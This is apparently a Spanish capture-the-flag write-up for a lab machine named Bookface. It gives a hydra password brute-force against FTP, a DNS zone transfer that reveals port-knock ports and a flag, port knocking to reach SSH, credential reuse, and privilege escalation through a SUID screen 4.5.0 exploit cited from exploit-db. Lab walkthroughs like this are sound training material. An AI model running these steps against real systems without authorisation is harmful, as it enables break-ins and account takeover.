# Bookface
## Initial Scan

Tenemos abiertos casi todos los puertos, de hecho todos menos el ssh que esta filtrado

## Enum
```
Jerry is a new developer and has made a few mistakes!
```
Parece un user vamos a testarlo en los principales servicios ftp,httpauth,smb

### FTP
```
hydra -l jerry -P /home/pj/rockyou.txt ftp://10.10.164.44 -t 64
```
Dentro tenemos
```
dr-xr-xr-x    2 1001     1001         4096 Feb 23  2019 .
dr-xr-xr-x    2 1001     1001         4096 Feb 23  2019 ..
-rw-r--r--    1 1001     1001          220 Feb 23  2019 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 23  2019 .bashrc
-rw-r--r--    1 1001     1001          655 Feb 23  2019 .profile
-rw-------    1 1001     1001          608 Feb 23  2019 .viminfo
-rwxr-xr-x    1 0        0              33 Feb 23  2019 flag1
-rw-rw-r--    1 1001     1001          141 Feb 23  2019 note
```
En note tambien tenemos información importante
```
Jerry, I finally got a chance to update our internal social media platform (bookface.com).
```
Podemos checkear esta URL en el servidor DNS o conectarnos al HTTP mediante esa direccion modificanfo el /etc/hosts
### DNS
Checkeamos la URL
```
 dig axfr bookface.com @IP
```
Y obtenemos lo siguiente
```
bookface.com.		10800	IN	TXT	"Ports: 6786 9893 8748 3443 - Who cares about order tho right?"
bookface.com.		10800	IN	TXT	"Flag2:a17f17ba86d8271da60ed8436667f412"
```
### SSH
Lo primero es conseguir abrir el puerto
```
knock 10.10.164.44 8748 9893 6786 3443
```
Una vez abierto podemos checkear reutilizacion de creds, cosa que ocurre

Una vez dentro la flag 3 esta en /home

## Privesc

Mirando los SUID encontramos este
```
/bin/screen-4.5.0/screen-4.05.0
```
Para el cual existe un exploit bien conocido
```
https://www.exploit-db.com/exploits/41154
```
Pasamos el exploit a la máquina usando un servidor HTTP de Python y ya estaría
